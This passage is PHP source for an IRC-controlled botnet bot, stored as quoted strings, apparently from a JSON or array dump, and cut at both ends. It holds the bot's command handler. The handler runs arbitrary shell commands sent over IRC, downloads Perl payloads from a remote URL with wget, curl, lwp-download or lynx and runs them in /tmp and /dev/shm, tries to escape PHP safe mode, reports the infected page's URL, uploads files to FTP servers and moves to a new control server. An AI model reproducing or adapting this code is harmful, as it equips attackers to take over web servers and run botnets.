            "\t\t\t\t\t\t\t\t\tif( $this->is_authed( $host ) == false )",
            "\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\tswitch( substr( $mcmd[ 0 ], 1 ) )",
            "\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\tcase \"auth\":",
            "\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t$this->auth_host( $nick, $mcmd[ 1 ], $host );",
            "\t\t\t\t\t\t\t\t\t\t\t\tif( $this->is_authed( $host ) )",
            "\t\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), \"[ auth ] Successful login from [ \".$nick.\" ]\" );",
            "\t\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\t\telse",
            "\t\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), \"[ auth ] Failed attempt from [ \".$nick.\" ]\" );",
            "\t\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\t\tbreak;",
            "\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\telse",
            "\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\tswitch(substr($mcmd[0],1)) ",
            "\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\tcase \"exec\":",
            "\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\tif( !$this->is_safe( ) )",
            "\t\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t$command = substr( strstr( $msg, $mcmd[0] ), strlen( $mcmd[0] ) + 1 );",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t$returndata = $this->ex( $command );",
            "\t\t\t\t\t\t\t\t\t\t\t\t\tif( !empty( $returndata ) )",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), '[ exec ] '.$returndata );",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\t\tbreak;",
            "\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\tcase \"info\":",
            "\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t$safemode = \"on\";",
            "\t\t\t\t\t\t\t\t\t\t\t\tif( !$this->is_safe( ) )",
            "\t\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t$safemode = \"off\";",
            "\t\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), '[ info ] '.php_uname( ).' ( SAFE: '.$safemode.' )' );",
            "\t\t\t\t\t\t\t\t\t\t\t\tbreak;",
            "\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\tcase \"safe\":",
            "\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t$safemode = \"on\";",
            "\t\t\t\t\t\t\t\t\t\t\t\tif( !$this->is_safe( ) )",
            "\t\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t$safemode = \"off\";",
            "\t\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), '[ safe ] '.$safemode );",
            "\t\t\t\t\t\t\t\t\t\t\t\tbreak;",
            "\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\tcase \"uname\":",
            "\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), '[ uname ] '.php_uname( ) );",
            "\t\t\t\t\t\t\t\t\t\t\t\tbreak;",
            "\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\tcase \"dropperl\":",
            "\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\tif( $this->is_safe( ) )",
            "\t\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), '[ dropperl ] Safe mode is ON' );",
            "\t\t\t\t\t\t\t\t\t\t\t\t\tbreak;",
            "\t\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\t\t",
            "\t\t\t\t\t\t\t\t\t\t\t\t$perl_file = $mcmd[1];",
            "\t\t\t\t\t\t\t\t\t\t\t\t",
            "\t\t\t\t\t\t\t\t\t\t\t\tif( !empty( $perl_file ) )",
            "\t\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t$parsed_url = $this->parse_url_s( $perl_file );",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t$new_remote = $parsed_url[ 'scheme' ].'://'.$parsed_url[ 'host' ].$parsed_url[ 'dir' ].'/';",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t$new_local \t= $parsed_url[ 'file' ];",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t$file_type\t= $parsed_url[ 'file_ext' ];",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t$this->ex('cd /tmp;wget '.$new_remote.$new_local.';perl '.$new_local.';rm -rf *'.$file_type.'*');",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t$this->ex('cd /tmp;curl -O '.$new_remote.$new_local.';perl '.$new_local.';rm -rf *'.$file_type.'*');",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t$this->ex('cd /tmp;lwp-download '.$new_remote.$new_local.';perl '.$new_local.';rm -rf *'.$file_type.'*');",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t$this->ex('cd /tmp;lynx -source '.$new_remote.$new_local.';perl '.$new_local.';rm -rf *'.$file_type.'*');",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t$this->ex('cd /dev/shm;wget '.$new_remote.$new_local.';perl '.$new_local.';rm -rf *'.$file_type.'*');",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t$this->ex('cd /dev/shm;curl -O '.$new_remote.$new_local.';perl '.$new_local.';rm -rf *'.$file_type.'*');",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t$this->ex('cd /dev/shm;lwp-download '.$new_remote.$new_local.';perl '.$new_local.';rm -rf *'.$file_type.'*');",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t$this->ex('cd /dev/shm;lynx -source '.$new_remote.$new_local.';perl '.$new_local.';rm -rf *'.$file_type.'*');",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t$this->ex('cd /tmp;rm -rf *'.$file_type.'**');",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t$this->ex('cd /dev/shm;rm -rf *'.$file_type.'**');",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), '[ execrfi ] Executed file '.$new_remote.$new_local );",
            "\t\t\t\t\t\t\t\t\t\t\t\t\tbreak;",
            "\t\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\t\t",
            "\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), '[ execrfi ] Failure executing '.$perl_file );",
            "\t\t\t\t\t\t\t\t\t\t\t\tbreak;",
            "\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\tcase \"ip\":",
            "\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), '[ ip ] '.$_SERVER['SERVER_ADDR'] );",
            "\t\t\t\t\t\t\t\t\t\t\t\tbreak;",
            "\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\tcase \"execrfi\":",
            "\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t$fileUrl = $mcmd[1];",
            "\t\t\t\t\t\t\t\t\t\t\t\t",
            "\t\t\t\t\t\t\t\t\t\t\t\tif( !empty( $fileUrl ) )",
            "\t\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t$urli = parse_url( $fileUrl );",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t",
            "\t\t\t\t\t\t\t\t\t\t\t\t\tif( !empty( $urli['host'] ) && !empty( $urli['path'] ) && !empty( $urli['query'] ) )",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t$fp = fsockopen( $urli['host'], 80, $errno, $errstr, 5 );",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\tif( $fp )",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t$out = \"GET /\".$urli['path'].$urli['query'].\" HTTP/1.1\\r\\n\";",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t$out .= \"Host: \".$urli['host'].\"\\r\\n\";",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t$out .= \"Keep-Alive: 300\\r\\n\";",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t$out .= \"Connection: keep-alive\\r\\n\\r\\n\";",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tfwrite( $fp, $out );",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t$get_data = '';",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t\twhile(!feof($fp))",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t{ $get_data .= fgets( $fp, 256 ); }",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), '[ execrfi ] Executed file '.$fileUrl );",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tbreak;",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\t\t",
            "\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), '[ execrfi ] Failure executing '.$fileUrl );",
            "\t\t\t\t\t\t\t\t\t\t\t\tbreak;",
            "\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\tcase \"base64\":",
            "\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t$str_ed = substr( strstr( $msg, $mcmd[1] ), strlen( $mcmd[1] ) + 1 );",
            "\t\t\t\t\t\t\t\t\t\t\t\tswitch( $mcmd[1] )",
            "\t\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t\tcase \"encode\":",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), \"[ base64 ] encode [ '\".$str_ed.\"' -> '\".base64_encode($str_ed).\"' ]\" );",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\tbreak;",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\t\t\tcase \"decode\":",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), \"[ base64 ] decode [ '\".$str_ed.\"' -> '\".base64_decode($str_ed).\"' ]\" );",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\tbreak;",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\t\tbreak;",
            "\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\tcase \"md5\":",
            "\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t$str_md5 = substr( strstr( $msg, $mcmd[0] ), strlen( $mcmd[0] ) + 1 );",
            "\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), \"[ md5 ] [ '\".$str_md5.\"' -> '\".md5($str_md5).\"' ]\" );",
            "\t\t\t\t\t\t\t\t\t\t\t\tbreak;",
            "\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\tcase \"dns\":",
            "\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\tif(isset($mcmd[1])) ",
            "                               \t\t\t\t\t{",
            "                                  \t\t\t\t\t$ip = explode(\".\",$mcmd[1]); ",
            "                                  \t\t\t\t\tif(count($ip)==4 && is_numeric($ip[0]) && is_numeric($ip[1]) ",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t&& is_numeric($ip[2]) && is_numeric($ip[3])) ",
            "                                  \t\t\t\t\t{",
            "                                     \t\t\t\t\t$this->privmsg($this->get_chan( ),\"[ dns ]: \".$mcmd[1].\" => \".gethostbyaddr($mcmd[1])); ",
            "                                  \t\t\t\t\t}",
            "                                  \t\t\t\t\telse ",
            "                                  \t\t\t\t\t{",
            "                                     \t\t\t\t\t$this->privmsg($this->get_chan( ),\"[ dns ]: \".$mcmd[1].\" => \".gethostbyname($mcmd[1])); ",
            "                                  \t\t\t\t\t}",
            "                               \t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\t\tbreak;",
            "\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\tcase \"exit\":",
            "\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\tfclose( $this->conn );",
            "\t\t\t\t\t\t\t\t\t\t\t\texit( );",
            "\t\t\t\t\t\t\t\t\t\t\t\tbreak;",
            "\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\tcase \"restart\":",
            "\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), \"[ restart ] executed by [\".$nick.\"]\" );",
            "\t\t\t\t\t\t\t\t\t\t\t\t$this->send( \"QUIT :restart command from \".$nick );",
            "\t\t\t\t\t\t\t\t\t\t\t\tfclose( $this->conn );",
            "\t\t\t\t\t\t\t\t\t\t\t\t$this->start();",
            "\t\t\t\t\t\t\t\t\t\t\t\tbreak;",
            "\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\tcase \"breaksafe\":",
            "\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\tif( $this->is_safe( ) )",
            "\t\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t\tini_restore( \"safe_mode\" );",
            "\t\t\t\t\t\t\t\t\t\t\t\t\tini_restore( \"open_basedir\" );",
            "\t\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\t\t",
            "\t\t\t\t\t\t\t\t\t\t\t\t$safemode = \"on\";",
            "\t\t\t\t\t\t\t\t\t\t\t\tif( !$this->is_safe( ) )",
            "\t\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t$safemode = \"off\";",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t$this->set_nick();",
            "\t\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), '[ safe ] '.$safemode );",
            "\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\tcase \"moveserver\":",
            "\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\tif( count( $mcmd ) > 3 )",
            "\t\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t$server = $mcmd[1];",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t$port = $mcmd[2];",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t$channel = $mcmd[3];",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t$key = $mcmd[4];",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t",
            "\t\t\t\t\t\t\t\t\t\t\t\t\tif( $this->using_encode )",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t$this->config[ 'server' ] = base64_encode( $server );",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t$this->config[ 'chan' ] = base64_encode( str_replace( \"#\", \"\", $channel ) );",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t$this->config[ 'key' ] = base64_encode( $key );",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\t\t\telse",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t$this->config[ 'server' ] = $server;",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t$this->config[ 'chan' ] = str_replace( \"#\", \"\", $channel );",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t$this->config[ 'key' ] = $key;",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t$this->config[ 'port' ] = $port;",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), \"[ moveserver ] \".$server.\" => \".$port.\" => \".$channel.\" => \".$key );",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t$this->send( \"QUIT :moveserver command from \".$nick );",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t",
            "\t\t\t\t\t\t\t\t\t\t\t\t\tfclose( $this->conn );",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t$this->start();",
            "\t\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\t\tbreak;",
            "\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\tcase \"whois\":",
            "\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t$param2 = $mcmd[1];",
            "\t\t\t\t\t\t\t\t\t\t\t\t",
            "\t\t\t\t\t\t\t\t\t\t\t\tif( !empty( $param2 ) )",
            "\t\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t//do it",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t//http://ws.arin.net/whois/?queryinput=127.0.0.1",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t$fp = fsockopen( \"ws.arin.net\", 80, $errno, $errstr, 30 );",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t",
            "\t\t\t\t\t\t\t\t\t\t\t\t\tif( $fp )",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t$out = \"GET /whois/?queryinput=$param2 HTTP/1.1\\r\\n\";",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t$out .= \"Host: ws.arin.net\\r\\n\";",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t$out .= \"Keep-Alive: 300\\r\\n\";",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t$out .= \"Connection: keep-alive\\r\\n\\r\\n\";",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\tfwrite( $fp, $out );",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t$whodata = '';",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\twhile(!feof($fp))",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t/*do nothing*/",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t$whodata .= fread( $fp, 1024 );",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t$explk = explode( \"<div id=\\\"content\\\">\", $whodata );",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t$explk = explode( \"</div>\", $explk[1] );",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t$htmldat = strip_tags( $explk[0] );",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\tfclose( $fp );",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), \"[ whois ] $htmldat\" );",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t}else{",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), \"[ whois ] Error: $errstr\" );",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\t\telse",
            "\t\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), \"[ whois ] Invalid params, use .whois <ip/host>\" );",
            "\t\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\t\tbreak;",
            "\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\tcase \"upftp\":",
            "\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t//ftp://user:password@host.com",
            "\t\t\t\t\t\t\t\t\t\t\t\t$pftp = parse_url( $mcmd[1] );",
            "\t\t\t\t\t\t\t\t\t\t\t\t$file = $mcmd[2];",
            "\t\t\t\t\t\t\t\t\t\t\t\t$dest = $mcmd[3];",
            "\t\t\t\t\t\t\t\t\t\t\t\t",
            "\t\t\t\t\t\t\t\t\t\t\t\tif( empty( $pftp[ 'host' ] )",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t|| empty( $pftp[ 'user' ] )",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t|| empty( $pftp[ 'pass' ] )",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t|| empty( $file )",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t|| empty( $dest ) )",
            "\t\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), \"[ upftp ] URL line invalid!\" );",
            "\t\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\t\telse",
            "\t\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t$conn_id = ftp_connect( $pftp[ 'host' ] );",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t$login_result = ftp_login( $conn_id, $pftp[ 'user' ], $pftp[ 'pass' ] );",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t",
            "\t\t\t\t\t\t\t\t\t\t\t\t\tif( ( !$conn_id ) || ( !$login_result ) ) ",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), \"[ upftp ] FTP connection failed!\" );",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\t\t\telse",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), \"[ upftp ] Connected to \".$pftp[ 'host' ].\" for user \".$pftp[ 'user' ] );",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t$upload = ftp_put( $conn_id, $dest, $file, FTP_BINARY );",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\tif( !$upload )",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), \"[ upftp ] FTP upload faled!\" );",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\telse",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), \"[ upftp ] FTP upload success!\" );",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), \"[ upftp ] Uploaded '\".$file.\"' to '\".$dest.\"'\" );",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\t\tbreak;",
            "\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\tcase \"joinchan\":",
            "\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t$channel = $mcmd[1];",
            "\t\t\t\t\t\t\t\t\t\t\t\t$key = $mcmd[2];",
            "\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), \"[ joinchan ] \".$channel.\" => \".$key );",
            "\t\t\t\t\t\t\t\t\t\t\t\t$this->join( $channel, $key );",
            "\t\t\t\t\t\t\t\t\t\t\t\tbreak;",
            "\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\tcase \"partchan\":",
            "\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), \"[ partchan ] \".$mcmd[1] );",
            "\t\t\t\t\t\t\t\t\t\t\t\t$this->send( \"PART \".$mcmd[1] );",
            "\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\tcase \"getvuln\":",
            "\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t$server_name = $_SERVER['SERVER_NAME'];",
            "\t\t\t\t\t\t\t\t\t\t\t\t$req_uri = $_SERVER['REQUEST_URI'];",
            "\t\t\t\t\t\t\t\t\t\t\t\t",
            "\t\t\t\t\t\t\t\t\t\t\t\tif( $server_name != \"localhost\" && $server_name != \"127.0.0.1\" )",
            "\t\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t\tif( strlen( $server_name ) && strlen( $req_uri ) )",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t$vuln = \"http://\".$server_name.$req_uri;",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), \"[ getvuln ] \".$vuln );",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\t\tbreak;",
            "\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\tcase \"download\":",
            "\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\tif( count( $mcmd ) > 2 )",
            "\t\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t\tif( !$fp = fopen( $mcmd[ 2 ], \"w\" ) )",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), \"[ download ] Permission denied!\" );",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\t\t\telse",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\tif( !$get = file( $mcmd[ 1 ] ) )",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), \"[ download ] Download failed!\" );",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\telse",
